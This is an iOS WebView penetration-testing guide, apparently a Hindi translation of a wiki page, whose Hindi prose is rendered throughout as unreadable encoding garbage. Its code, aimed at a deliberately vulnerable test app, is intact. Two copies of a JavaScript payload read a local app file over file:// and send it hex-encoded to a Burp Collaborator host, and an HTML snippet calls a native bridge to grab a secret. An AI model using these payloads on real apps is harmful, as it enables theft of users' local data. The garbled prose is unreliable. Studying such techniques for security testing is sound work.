рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╕реНрд░реЛрдд рдХреЛрдб рд╣реИ рддреЛ рдЖрдк рдЙрди рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред **рд╕рдВрдХрд▓рд┐рдд** **рдмрд╛рдЗрдирд░реА** рд╣реЛрдиреЗ рдкрд░ рднреА рдЖрдк рдЗрди рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
### рдлрд╛рдЗрд▓ рдПрдХреНрд╕реЗрд╕

* **UIWebView:**
* `file://` рд╕реНрдХреАрдо рд╣рдореЗрд╢рд╛ рд╕рдХреНрд╖рдо рд░рд╣рддреА рд╣реИред
* `file://` URLs рд╕реЗ рдлрд╛рдЗрд▓ рдПрдХреНрд╕реЗрд╕ рд╣рдореЗрд╢рд╛ рд╕рдХреНрд╖рдо рд░рд╣рддрд╛ рд╣реИред
* `file://` URLs рд╕реЗ рдпреВрдирд┐рд╡рд░реНрд╕рд▓ рдПрдХреНрд╕реЗрд╕ рд╣рдореЗрд╢рд╛ рд╕рдХреНрд╖рдо рд░рд╣рддрд╛ рд╣реИред
* рдпрджрд┐ рдЖрдк `UIWebView` рд╕реЗ рдкреНрд░рднрд╛рд╡реА рдУрд░рд┐рдЬрд┐рди рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ рдЬрд╣рд╛рдБ `baseURL` рдХреЛ рднреА `nil` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рджреЗрдЦреЗрдВрдЧреЗ рдХрд┐ рдпрд╣ **"null" рдкрд░ рд╕реЗрдЯ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ**, рдЗрд╕рдХреЗ рдмрдЬрд╛рдп рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕рд╛ рдХреБрдЫ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛: `applewebdata://5361016c-f4a0-4305-816b-65411fc1d780`. рдпрд╣ рдУрд░рд┐рдЬрд┐рди "applewebdata://" "file://" рдУрд░рд┐рдЬрд┐рди рдХреЗ рд╕рдорд╛рди рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **Same-Origin Policy рдХреЛ рд▓рд╛рдЧреВ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ** рдФрд░ рд╕реНрдерд╛рдиреАрдп рдлрд╛рдЗрд▓реЛрдВ рдФрд░ рдХрд┐рд╕реА рднреА рд╡реЗрдм рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

{% tabs %}
{% tab title="exfiltrate_file" %}
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
{% endtab %}
{% endtabs %}

* **WKWebView**:
* **`allowFileAccessFromFileURLs`** (`WKPreferences`, `false` рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ): рдпрд╣ `file://` рд╕реНрдХреАрдо URL рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓ рд░рд╣реЗ JavaScript рдХреЛ рдЕрдиреНрдп `file://` рд╕реНрдХреАрдо URLs рд╕реЗ рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
* **`allowUniversalAccessFromFileURLs`** (`WKWebViewConfiguration`, `false` рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ): рдпрд╣ `file://` рд╕реНрдХреАрдо URL рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓ рд░рд╣реЗ JavaScript рдХреЛ рдХрд┐рд╕реА рднреА рдореВрд▓ рд╕реЗ рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдЖрдк рдЗрди рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕реЛрд░реНрд╕ рдХреЛрдб рдпрд╛ рд╕рдВрдХрд▓рд┐рдд рдмрд╛рдЗрдирд░реА рдореЗрдВ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред\
рд╕рд╛рде рд╣реА, рдЖрдк рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдвреВрдБрдврдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд frida рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```

```bash
frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>
URL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/
Library/WKWebView/scenario1.html
javaScriptEnabled:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  false
allowUniversalAccessFromFileURLs:  0
```
#### рдордирдорд╛рдиреА рдлрд╛рдЗрд▓реЛрдВ рдХрд╛ рдбреЗрдЯрд╛ рдЪреБрд░рд╛рдирд╛
```javascript
//For some reason this payload doesn't work!!
//Let me know if you know how to exfiltrate local files from a WKWebView
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## WebView рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдЬрд╛рдЧрд░ рдХрд┐рдП рдЧрдП рдиреЗрдЯрд┐рд╡ рдореЗрдердбреНрд╕

iOS 7 рдХреЗ рдмрд╛рдж рд╕реЗ, Apple рдиреЗ APIs рдкреЗрд╢ рдХрд┐рдП рд╣реИрдВ рдЬреЛ WebView рдореЗрдВ JavaScript рд░рдирдЯрд╛рдЗрдо рдФрд░ рдиреЗрдЯрд┐рд╡ Swift рдпрд╛ Objective-C рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рдмреАрдЪ **рд╕рдВрдЪрд╛рд░ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред**

рдиреЗрдЯрд┐рд╡ рдХреЛрдб рдФрд░ JavaScript рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХреЗ рджреЛ рдореМрд▓рд┐рдХ рддрд░реАрдХреЗ рд╣реИрдВ:

* **JSContext**: рдЬрдм рдПрдХ Objective-C рдпрд╛ Swift рдмреНрд▓реЙрдХ рдХреЛ `JSContext` рдореЗрдВ рдПрдХ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдЕрд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ JavaScriptCore рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдмреНрд▓реЙрдХ рдХреЛ рдПрдХ JavaScript рдлрдВрдХреНрд╢рди рдореЗрдВ рд▓рдкреЗрдЯ рджреЗрддрд╛ рд╣реИред
* **JSExport рдкреНрд░реЛрдЯреЛрдХреЙрд▓**: `JSExport`-рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдорд┐рд▓реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдореЗрдВ рдШреЛрд╖рд┐рдд рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ, рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдердбреНрд╕ рдФрд░ рдХреНрд▓рд╛рд╕ рдореЗрдердбреНрд╕ JavaScript рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдореИрдк рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЬреЛ рд╕рднреА JavaScript рдХреЛрдб рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рд╣реЛрддреЗ рд╣реИрдВред JavaScript рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рд╕рдВрд╢реЛрдзрди рдиреЗрдЯрд┐рд╡ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдкрд░рд┐рд▓рдХреНрд╖рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдХреЗрд╡рд▓ `JSExport` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреНрд▓рд╛рд╕ рд╕рджрд╕реНрдп** JavaScript рдХреЛрдб рдХреЗ рд▓рд┐рдП рд╕реБрд▓рдн рдмрдирд╛рдП рдЬрд╛рддреЗ рд╣реИрдВред\
рдЙрд╕ рдХреЛрдб рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ рдЬреЛ рдиреЗрдЯрд┐рд╡ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ WebView рд╕реЗ рдЬреБрдбрд╝реЗ `JSContext` рдХреЗ рд╕рд╛рде рдореИрдк рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░реЗрдВ рдХрд┐ рдпрд╣ рдХреНрдпрд╛ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдХреЛрдИ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рд╕реБрд▓рдн рдФрд░ WebView рдХреЗ рд▓рд┐рдП рдЙрдЬрд╛рдЧрд░ рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред\
Objective-C рдореЗрдВ, `UIWebView` рд╕реЗ рдЬреБрдбрд╝рд╛ `JSContext` рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```objectivec
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### JavascriptBridge рд╕рдХреНрд╖рдо рдХрд░рдирд╛

**`WKWebView` рдореЗрдВ JavaScript рдХреЛрдб рдЕрднреА рднреА рдиреЗрдЯрд┐рд╡ рдРрдк рдХреЛ рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди `UIWebView` рдХреЗ рд╡рд┐рдкрд░реАрдд, рд╕реАрдзреЗ `JSContext` рдХрд╛ рд╕рдВрджрд░реНрдн рд▓реЗрдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред** рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рд╕рдВрдЪрд╛рд░ рдПрдХ рдореИрд╕реЗрдЬрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдФрд░ `postMessage` рдлрдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ JavaScript рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдиреЗрдЯрд┐рд╡ Objective-C рдпрд╛ Swift рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдореЗрдВ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬ рдХрд░рддрд╛ рд╣реИред рдореИрд╕реЗрдЬ рд╣реИрдВрдбрд▓рд░реНрд╕ рдХреЛ [`add(_ scriptMessageHandler:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add) рдореЗрдердб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### рд╕рдВрджреЗрд╢ рднреЗрдЬрдирд╛

рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореИрд╕реЗрдЬ рд╣реИрдВрдбрд▓рд░ рдХреЛ рдирд╛рдо `"name"` (рдпрд╛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рдЕрдиреБрд╕рд╛рд░ `"javaScriptBridge"`) рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рдиреЗ рд╕реЗ JavaScript рдлрдВрдХреНрд╢рди `window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage` рд╕рднреА рдлреНрд░реЗрдореНрд╕ рдореЗрдВ рдФрд░ рд╕рднреА рд╡реЗрдм рд╡реНрдпреВрдЬ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдпреВрдЬрд░ рдХрдВрдЯреЗрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕реЗ рдлрд┐рд░ [HTML рдлрд╛рдЗрд▓ рдореЗрдВ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33):
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
//After testing the previos funtion I got the error TypeError: undefined is not an object (evaluating 'window.webkit.messageHandlers')
//But the following code worked to call the exposed javascriptbridge with the args "addNumbers", "1", "2"

document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
рдиреЗрдЯрд┐рд╡ рдлрдВрдХреНрд╢рди рдПрдХ рдмрд╛рд░ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж рдЖрдорддреМрд░ рдкрд░ рд╡реЗрдм рдкреЗрдЬ рдХреЗ рдЕрдВрджрд░ **рдХреБрдЫ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рдХрд░реЗрдЧрд╛** (рдиреАрдЪреЗ `evaluateJavascript` рджреЗрдЦреЗрдВ) рдЖрдк **рдлрдВрдХреНрд╢рди рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░рдиреЗ** рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ рддрд╛рдХрд┐ **рдкрд░рд┐рдгрд╛рдо рдЪреБрд░рд╛ рд╕рдХреЗрдВ**ред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдиреАрдЪреЗ рджреА рдЧрдИ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдлрдВрдХреНрд╢рди **`javascriptBridgeCallBack`** рджреЛ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ (рдХреЙрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдлрдВрдХреНрд╢рди рдФрд░ **рдкрд░рд┐рдгрд╛рдо**). рдЕрдЧрд░ рдЖрдк HTML рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рд░рдЦрддреЗ рд╣реИрдВ рдЬреЛ рд▓реЛрдб рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ рддреЛ рдЖрдк **рдкрд░рд┐рдгрд╛рдо рдХреЗ рд╕рд╛рде рдПрдХ рдЕрд▓рд░реНрдЯ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ:
```markup
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
### рдХреЙрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдлрдВрдХреНрд╢рди

рдХреЙрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдлрдВрдХреНрд╢рди [`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29) рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```
### рдкрд░реАрдХреНрд╖рдг

рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЕрдВрджрд░ postMessage рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк:

* рд╕рд░реНрд╡рд░ рдХреЗ рдкреНрд░рддрд┐рд╕рд╛рдж рдХреЛ рдмрджрд▓реЗрдВ (MitM)
* рдбрд╛рдпрдирд╛рдорд┐рдХ рдЗрдВрд╕реНрдЯреНрд░реБрдореЗрдВрдЯреЗрд╢рди рдХрд░реЗрдВ рдФрд░ Frida рдЬреИрд╕реЗ рдлреНрд░реЗрдорд╡рд░реНрдХреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ JavaScript рдкреЗрд▓реЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ рдФрд░ iOS WebViews рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз JavaScript рдореВрд▓реНрдпрд╛рдВрдХрди рдлрдВрдХреНрд╢рдиреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ ([`stringByEvaluatingJavaScriptFromString:`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc) `UIWebView` рдХреЗ рд▓рд┐рдП рдФрд░ [`evaluateJavaScript:completionHandler:`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc) `WKWebView` рдХреЗ рд▓рд┐рдП).

## iOS WebViews рдХреА рдбрд┐рдмрдЧрд┐рдВрдЧ

(рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews) рд╕реЗ)

iOS webviews рдореЗрдВ, `console.log()` рдХреЛ рдкрд╛рд╕ рдХрд┐рдП рдЧрдП рд╕рдВрджреЗрд╢ Xcode рд▓реЙрдЧреНрд╕ рдореЗрдВ _рдирд╣реАрдВ_ рдЫрдкрддреЗ рд╣реИрдВред рдлрд┐рд░ рднреА, Safari рдХреЗ рдбреЗрд╡рд▓рдкрд░ рдЯреВрд▓реНрд╕ рдХреЗ рд╕рд╛рде рд╡реЗрдм рд╕рд╛рдордЧреНрд░реА рдХреА рдбрд┐рдмрдЧрд┐рдВрдЧ рдХрд░рдирд╛ рдЕрдкреЗрдХреНрд╖рд╛рдХреГрдд рдЖрд╕рд╛рди рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдХреБрдЫ рд╕реАрдорд╛рдПрдБ рд╣реИрдВ:

* iOS webviews рдХреА рдбрд┐рдмрдЧрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП Safari рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХрд╛ рдбреЗрд╡рд▓рдкрдореЗрдВрдЯ рдХрдВрдкреНрдпреВрдЯрд░ macOS рдкрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред
* рдЖрдк Xcode рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдкрдиреЗ рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░ рд▓реЛрдб рдХрд┐рдП рдЧрдП рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдореЗрдВ рд╣реА webviews рдХреА рдбрд┐рдмрдЧрд┐рдВрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк App Store рдпрд╛ Apple Configurator рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдореЗрдВ webviews рдХреА рдбрд┐рдмрдЧрд┐рдВрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред

рдЗрди рд╕реАрдорд╛рдУрдВ рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрддреЗ рд╣реБрдП, рдпрд╣рд╛рдБ iOS рдореЗрдВ рдПрдХ webview рдХреА рд░рд┐рдореЛрдЯ рдбрд┐рдмрдЧрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХрджрдо рд╣реИрдВ:

* рдкрд╣рд▓реЗ, рдЕрдкрдиреЗ iOS рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░ Safari Web Inspector рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП iOS _Settings_ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЦреЛрд▓реЗрдВ, **Settings > Safari > Advanced** рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░реЗрдВ, рдФрд░ _Web Inspector_ рд╡рд┐рдХрд▓реНрдк рдХреЛ рдЪрд╛рд▓реВ рдХрд░реЗрдВред

![iOS Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/ios-safari-settings.jpg)

* рдЕрдЧрд▓рд╛, рдЖрдкрдХреЛ рдЕрдкрдиреЗ рдбреЗрд╡рд▓рдкрдореЗрдВрдЯ рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ Safari рдореЗрдВ рдбреЗрд╡рд▓рдкрд░ рдЯреВрд▓реНрд╕ рднреА рд╕рдХреНрд╖рдо рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЕрдкрдиреЗ рдбреЗрд╡рд▓рдкрдореЗрдВрдЯ рдорд╢реАрди рдкрд░ Safari рд▓реЙрдиреНрдЪ рдХрд░реЗрдВ рдФрд░ рдореЗрдиреВ рдмрд╛рд░ рдореЗрдВ **Safari > Preferences** рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░реЗрдВред рдЬреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рдкреИрдирд▓ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ, рдЙрд╕рдореЗрдВ _Advanced_ рдЯреИрдм рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ рдиреАрдЪреЗ рджрд┐рдП рдЧрдП _Show Develop menu_ рд╡рд┐рдХрд▓реНрдк рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВред рдЗрд╕рдХреЗ рдмрд╛рдж, рдЖрдк рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рдкреИрдирд▓ рдХреЛ рдмрдВрдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

![Mac Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-settings.jpg)

* рдЕрдкрдиреЗ iOS рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛ рдЕрдкрдиреЗ рдбреЗрд╡рд▓рдкрдореЗрдВрдЯ рдХрдВрдкреНрдпреВрдЯрд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВ рдФрд░ рдЕрдкрдирд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд▓реЙрдиреНрдЪ рдХрд░реЗрдВред
* рдЕрдкрдиреЗ рдбреЗрд╡рд▓рдкрдореЗрдВрдЯ рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ Safari рдореЗрдВ, рдореЗрдиреВ рдмрд╛рд░ рдореЗрдВ _Develop_ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рдЕрдкрдиреЗ iOS рдбрд┐рд╡рд╛рдЗрд╕ рдХреЗ рдирд╛рдо рд╡рд╛рд▓реЗ рдбреНрд░реЙрдкрдбрд╛рдЙрди рд╡рд┐рдХрд▓реНрдк рдкрд░ рд╣реЛрд╡рд░ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрдкрдХреЗ iOS рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░ рдЪрд▓ рд░рд╣реЗ webview рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрд╕ рдХреА рд╕реВрдЪреА рджрд┐рдЦрд╛рдИ рджреЗред

![Mac Safari develop menu](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-develop-menu.jpg)

